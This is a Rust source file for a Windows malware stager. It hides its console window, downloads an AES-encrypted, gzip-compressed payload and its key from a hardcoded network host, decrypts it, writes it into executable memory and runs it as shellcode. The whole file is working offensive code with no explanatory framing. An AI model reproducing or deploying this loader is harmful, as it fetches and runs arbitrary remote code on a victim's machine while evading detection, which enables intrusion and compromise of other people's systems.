#![windows_subsystem = "windows"] //hide the terminal
//What is wrong with you? And why are you blue?
use flate2::read::GzDecoder;
use aes::Aes256;
use block_modes::{Cbc, BlockMode, block_padding::Pkcs7};
use std::io::Read;
use hex;
use std::ptr::null_mut;
use std::mem::transmute;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, MEM_RELEASE};
use winapi::um::memoryapi::{VirtualFree, VirtualAlloc};
type Aes256Cbc = Cbc<Aes256, Pkcs7>;

fn main() {
    let keyfile = "http://192.168.121.133/payload.bin.key";
    let file = "http://192.168.121.133/payload.bin";

    let raw_data = reqwest::blocking::get(file).unwrap().bytes().unwrap().to_vec();
    let key_raw = reqwest::blocking::get(keyfile).unwrap().bytes().unwrap().to_vec();

    let key = hex::decode(std::str::from_utf8(&key_raw).unwrap()).unwrap();
    let (iv, encrypted_compressed_data) = raw_data.split_at(16);
    let cipher = Aes256Cbc::new_from_slices(&key, iv).unwrap();
    let compressed_data = cipher.decrypt_vec(encrypted_compressed_data).unwrap();

    let mut decoder = GzDecoder::new(&compressed_data[..]);
    let mut decompressed_data = Vec::<u8>::new();
    decoder.read_to_end(&mut decompressed_data).unwrap();

    unsafe {
        let memory = VirtualAlloc(
            null_mut(),
            decompressed_data.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ) as *mut u8;
    
        std::ptr::copy_nonoverlapping(decompressed_data.as_ptr(), memory, decompressed_data.len());
    
        let func: extern "C" fn() = transmute(memory);
        func();
    
        VirtualFree(memory as *mut _, 0, MEM_RELEASE);
    }
}
